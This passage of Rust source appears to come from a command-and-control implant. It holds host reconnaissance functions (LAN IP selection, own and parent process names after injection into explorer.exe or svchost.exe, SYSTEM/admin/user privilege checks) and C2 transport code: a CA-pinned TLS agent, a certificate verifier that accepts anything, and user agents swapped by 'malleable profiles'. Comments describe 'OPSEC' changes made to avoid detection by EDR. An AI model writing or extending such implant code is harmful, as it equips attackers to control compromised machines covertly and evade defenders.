        let mut candidates: Vec<(u32, u32)> = Vec::with_capacity(n as usize); // (ip, score)
        for i in 0..(n as usize).min(4096) {
            let off = 4 + i * 20;
            if off + 20 > buf.len() { break; }
            let p = buf.as_ptr().add(off);
            let addr = *(p as *const u32);
            // Network byte order → dotted string
            let b0 = addr & 0xFF;
            let b1 = (addr >> 8) & 0xFF;
            let b2 = (addr >> 16) & 0xFF;
            let b3 = (addr >> 24) & 0xFF;
            // Skip 0.0.0.0, 127.x.x.x (loopback), 169.254.x.x (link-local),
            // 224.x.x.x+ (multicast), and 172.16.0.0–172.31.255.255 when the
            // UDP hint also returned a 172.17.x.x address (Docker bridge
            // scenario — keep looking for the real LAN IP).
            if addr == 0 { continue; }
            if b0 == 127 { continue; }       // loopback
            if b0 == 169 && b1 == 254 { continue; }  // link-local APIPA
            if b0 >= 224 { continue; }       // multicast / reserved
            // Score: prefer 10.x.x.x and 192.168.x.x (typical LAN ranges)
            // over 172.16-31.x.x (Docker bridge) and 172.x otherwise.
            let score = if b0 == 10 { 100 }
                else if b0 == 192 && b1 == 168 { 90 }
                else if b0 == 172 && (b1 >= 16 && b1 <= 31) { 50 }  // Docker/VPC private
                else if b0 == 100 && b1 >= 64 && b1 <= 127 { 30 } // CGNAT
                else { 10 };
            candidates.push((addr, score));
        }
        if candidates.is_empty() { return None; }
        // Pick the highest-scored IP. On ties, pick the first.
        candidates.sort_by(|a, b| b.1.cmp(&a.1));
        let (best_addr, _) = candidates[0];
        let b0 = best_addr & 0xFF;
        let b1 = (best_addr >> 8) & 0xFF;
        let b2 = (best_addr >> 16) & 0xFF;
        let b3 = (best_addr >> 24) & 0xFF;
        Some(format!("{}.{}.{}.{}", b0, b1, b2, b3))
    }
}

#[cfg(target_os = "windows")]
fn internal_ip_win() -> String {
    internal_ip_unix()
}

/// (own image name, parent image name) via WinAPI — no command execution.
/// After an `inject` the image IS the host process (explorer.exe, svchost.exe,
/// ...) which is exactly what the dashboard Process column must show.
#[cfg(target_os = "windows")]
fn process_chain_win(pid: u32) -> (String, String) {
    use winapi::um::libloaderapi::GetModuleFileNameW;
    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
                              PROCESSENTRY32W, TH32CS_SNAPPROCESS};
    use winapi::um::handleapi::CloseHandle;
    use winapi::shared::minwindef::FALSE;

    // Own image via GetModuleFileNameW (exe name only, no path)
    let mut path = [0u16; 1024];
    let len = unsafe { GetModuleFileNameW(std::ptr::null_mut(), path.as_mut_ptr(), 1024) } as usize;
    let own = String::from_utf16_lossy(&path[..len.min(1024)]);
    let own_name = own.rsplit('\\').next().unwrap_or("").to_string();

    // Parent PID via the process snapshot, then look its image name up in the
    // same pass (single snapshot for both).
    let mut own_parent_pid = 0u32;
    let mut parent_name = String::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap != winapi::um::handleapi::INVALID_HANDLE_VALUE {
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32FirstW(snap, &mut entry) != FALSE {
                // pass 1: find OUR entry → parent PID
                loop {
                    if entry.th32ProcessID == pid {
                        own_parent_pid = entry.th32ParentProcessID;
                    }
                    if Process32NextW(snap, &mut entry) == FALSE { break; }
                }
                // second pass: find parent by PID (snapshot still open)
                let mut e2: PROCESSENTRY32W = std::mem::zeroed();
                e2.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32FirstW(snap, &mut e2) != FALSE {
                    loop {
                        if e2.th32ProcessID == own_parent_pid && own_parent_pid != 0 {
                            parent_name = String::from_utf16_lossy(&e2.szExeFile)
                                .trim_end_matches('\0').to_string();
                            break;
                        }
                        if Process32NextW(snap, &mut e2) == FALSE { break; }
                    }
                }
            }
            CloseHandle(snap);
        }
    }
    (own_name, parent_name)
}

/// "system" | "admin" | "user" — GetUserNameW distinguishes NT AUTHORITY\SYSTEM
/// from an elevated admin. Hand-declared extern (advapi32) to avoid winapi
/// feature coupling — same convention as ad_map/ffi.rs.
#[cfg(target_os = "windows")]
fn privs_string_win(is_admin: bool) -> String {
    #[link(name = "advapi32")]
    extern "system" {
        fn GetUserNameW(lpBuffer: *mut u16, pcbBuffer: *mut u32) -> i32;
    }
    let mut buf = [0u16; 256];
    let mut size = 256u32;
    let ok = unsafe { GetUserNameW(buf.as_mut_ptr(), &mut size) };
    let user = if ok != 0 {
        String::from_utf16_lossy(&buf[..(size as usize).saturating_sub(1).min(256)])
            .trim_end_matches('\0').to_string()
    } else {
        String::new()
    };
    if user.eq_ignore_ascii_case("SYSTEM") || user.ends_with('$') {
        "system".to_string()
    } else if is_admin {
        "admin".to_string()
    } else {
        "user".to_string()
    }
}

#[cfg(target_os = "windows")]
fn check_admin() -> bool {
    #[link(name = "shell32")]
    extern "system" { fn IsUserAnAdmin() -> winapi::shared::minwindef::BOOL; }
    unsafe { IsUserAnAdmin() != 0 }
}

#[cfg(not(target_os = "windows"))]
fn get_hostname_unix() -> String {
    use std::process::Command;
    if let Ok(output) = Command::new("hostname").output() {
        if output.status.success() {
            return String::from_utf8_lossy(&output.stdout).trim().to_string();
        }
    }
    if let Ok(host) = std::fs::read_to_string("/proc/sys/kernel/hostname") {
        return host.trim().to_string();
    }
    "unknown".to_string()
}

#[cfg(not(target_os = "windows"))]
fn is_unix_admin() -> bool {
    use std::process::Command;
    if let Ok(output) = Command::new("id").arg("-u").output() {
        if output.status.success() {
            let uid: u32 = String::from_utf8_lossy(&output.stdout).trim().parse().unwrap_or(1000);
            return uid == 0;
        }
    }
    false
}

fn epoch() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64
}

// ── TLS Pinning Helpers ──────────────────────────────────────────────────────

// OPSEC FIX (audit I-M2): Cache the TLS ClientConfig — the expensive part
// (PEM parsing, ring provider init, ClientConfig building) only happens ONCE.
// The Agent itself is cheap to build (just stores config + user_agent), so we
// create a new one per-call with the current user_agent.
//
// Previously, every HTTP call created a new Agent + new ring provider init →
// CPU spike visible to EDR. Now: first call builds the config (cached), all
// subsequent calls reuse it (Arc clone = refcount++).
//
// Safety: ca_cert_pem is baked at build time and never changes at runtime, so
// caching the config built from it is safe. If the first build fails (bad PEM),
// the error is cached and all subsequent calls return the same error — which
// is correct behavior (don't retry a known-bad config).
use std::sync::OnceLock;
static CACHED_TLS_CONFIG: OnceLock<Result<Arc<ClientConfig>, String>> = OnceLock::new();

/// Build the TLS ClientConfig from the CA PEM — called ONCE, result cached.
fn build_tls_config(ca_pem: &str) -> Result<Arc<ClientConfig>, String> {
    use ureq::rustls::RootCertStore;
    use rustls_pemfile::certs;
    use std::io::BufReader;

    crate::core_agent::debug_log("[TLS] Step 1/6: Creating empty RootCertStore...");
    let mut root_store = RootCertStore::empty();

    crate::core_agent::debug_log(&format!("[TLS] Step 2/6: Parsing CA PEM ({} bytes, first 40 chars: {}...)",
        ca_pem.len(), &ca_pem[..40.min(ca_pem.len())]));
    let cert_bytes = ca_pem.as_bytes();
    let mut reader = BufReader::new(cert_bytes);

    crate::core_agent::debug_log("[TLS] Step 3/6: Calling pemfile::certs() to parse DER certs...");
    let parsed: Vec<_> = match certs(&mut reader).collect::<Result<Vec<_>, _>>() {
        Ok(certs) => {
            crate::core_agent::debug_log(&format!("[TLS] Step 3/6: PEM parsed OK — {} certificate(s) found", certs.len()));
            certs
        }
        Err(e) => {
            let err_msg = format!("CA cert PEM parse failed: {}", e);
            crate::core_agent::debug_log(&format!("[TLS] Step 3/6: FATAL — {}", err_msg));
            return Err(err_msg);
        }
    };

    if parsed.is_empty() {
        crate::core_agent::debug_log("[TLS] Step 3/6: FATAL — PEM parsed but 0 certs found (empty or corrupt PEM?)");
        return Err("CA cert PEM parse failed — no certs found".to_string());
    }

    // Log cert details for debugging
    for (i, cert) in parsed.iter().enumerate() {
        crate::core_agent::debug_log(&format!("[TLS] Cert #{}: {} bytes, subject={}",
            i, cert.len(),
            cert.iter().rev().take(40).rev().map(|b| format!("{:02x}", b)).collect::<String>()));
    }

    crate::core_agent::debug_log("[TLS] Step 4/6: Adding certs to RootCertStore...");
    for (i, cert) in parsed.iter().enumerate() {
        match root_store.add(cert.clone()) {
            Ok(()) => crate::core_agent::debug_log(&format!("[TLS] Step 4/6: Cert #{} added to store OK", i)),
            Err(e) => {
                let err_msg = format!("add CA cert #{}: {}", i, e);
                crate::core_agent::debug_log(&format!("[TLS] Step 4/6: FATAL — {}", err_msg));
                return Err(err_msg);
            }
        }
    }

    crate::core_agent::debug_log("[TLS] Step 5/6: Forcing ring crypto provider (aws-lc-rs broken on windows-gnu)...");
    let provider = ureq::rustls::crypto::ring::default_provider();
    crate::core_agent::debug_log("[TLS] Step 5/6: ring crypto provider initialized OK");

    crate::core_agent::debug_log("[TLS] Step 5/6: Building ClientConfig with ring provider...");
    let tls_config = match ClientConfig::builder_with_provider(Arc::new(provider))
        .with_safe_default_protocol_versions()
    {
        Ok(builder) => {
            crate::core_agent::debug_log("[TLS] Step 5/6: Protocol versions set, adding root certs...");
            builder
                .with_root_certificates(root_store)
                .with_no_client_auth()
        }
        Err(e) => {
            let err_msg = format!("Failed to set protocol versions: {}", e);
            crate::core_agent::debug_log(&format!("[TLS] Step 5/6: FATAL — {}", err_msg));
            return Err(err_msg);
        }
    };
    crate::core_agent::debug_log("[TLS] Step 5/6: ClientConfig built OK (ring provider, TLS pinning active)");

    crate::core_agent::debug_log("[TLS] build_tls_config() COMPLETE — caching config for future calls");
    Ok(Arc::new(tls_config))
}

/// Build a ureq Agent that only trusts our pinned CA cert.
/// Uses rustls + ring — no system trust store is consulted.
/// OPSEC FIX (audit I-M2): TLS config is cached after first call.
fn build_pinned_agent(ca_pem: &str, user_agent: &str) -> Result<ureq::Agent, String> {
    // Step 1: Get or build the cached TLS config (expensive — only first call)
    let tls_config = CACHED_TLS_CONFIG.get_or_init(|| build_tls_config(ca_pem));
    let tls_config = tls_config.as_ref().map_err(|e| {
        crate::core_agent::debug_log(&format!("[TLS] Using cached TLS error (config build failed on first call): {}", e));
        e.clone()
    })?;

    if CACHED_TLS_CONFIG.get().is_some() {
        crate::core_agent::debug_log("[TLS] Reusing cached ClientConfig (skip PEM parse, ring init, config build)");
    }

    // Step 2: Build a new Agent per-call (cheap) with the current user_agent.
    // The user_agent can change at runtime via malleable profile swaps, so we
    // can't cache the Agent itself — only the TLS config.
    crate::core_agent::debug_log("[TLS] Step 6/6: Building ureq Agent (timeout=30s, user_agent set)...");
    let agent = ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(30))
        .user_agent(user_agent)
        .tls_connector(Arc::new(tls_config.clone()))  // Arc<Arc<ClientConfig>> → Arc<dyn TlsConnector>
        .build();
    crate::core_agent::debug_log("[TLS] Step 6/6: ureq Agent built OK — TLS pinning ready");

    Ok(agent)
}

/// Build a no-verify TLS connector for dev/lab use only.
/// Should never be used in production builds (enforced by ca_cert_pem check).
/// Uses ring crypto provider explicitly (aws-lc-rs broken on windows-gnu).
fn build_noverify_tls() -> Arc<ClientConfig> {
    let provider = ureq::rustls::crypto::ring::default_provider();
    let config = ClientConfig::builder_with_provider(Arc::new(provider))
        .with_safe_default_protocol_versions()
        .expect("protocol versions")
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerifyVerifier))
        .with_no_client_auth();
    Arc::new(config)
}

// Custom verifier that accepts any certificate (dev/lab only)
#[derive(Debug)]
struct NoVerifyVerifier;

impl ServerCertVerifier for NoVerifyVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, ureq::rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, ureq::rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, ureq::rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        vec![
            SignatureScheme::RSA_PKCS1_SHA256,
            SignatureScheme::RSA_PKCS1_SHA384,
            SignatureScheme::RSA_PKCS1_SHA512,
            SignatureScheme::ECDSA_NISTP256_SHA256,
            SignatureScheme::ECDSA_NISTP384_SHA384,
            SignatureScheme::ECDSA_NISTP521_SHA512,
            SignatureScheme::RSA_PSS_SHA256,
            SignatureScheme::RSA_PSS_SHA384,
            SignatureScheme::RSA_PSS_SHA512,
            SignatureScheme::ED25519,
        ]
    }
}

pub fn base64_encode(data: &[u8]) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(CHARSET[((triple >> 18) & 0x3F) as usize] as char);
        out.push(CHARSET[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(CHARSET[((triple >> 6) & 0x3F) as usize] as char);
        } else { out.push('='); }
        if chunk.len() > 2 {
            out.push(CHARSET[(triple & 0x3F) as usize] as char);
        } else { out.push('='); }
    }
    out
}

pub fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let s = s.trim_end_matches('=');
    let mut out = Vec::new();
    let lookup = |c: u8| -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'+' => Some(62), b'/' => Some(63),
            _ => None,
        }
    };
    let bytes: Vec<u8> = s.bytes().filter_map(|b| lookup(b)).collect();
    for chunk in bytes.chunks(4) {
        if chunk.len() < 2 { continue; }
        let b0 = chunk[0] as u32; let b1 = chunk[1] as u32;
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let b3 = if chunk.len() > 3 { chunk[3] as u32 } else { 0 };
        let triple = (b0 << 18) | (b1 << 12) | (b2 << 6) | b3;
        out.push(((triple >> 16) & 0xFF) as u8);
        if chunk.len() > 2 { out.push(((triple >> 8) & 0xFF) as u8); }
        if chunk.len() > 3 { out.push((triple & 0xFF) as u8); }
    }
    Some(out)
}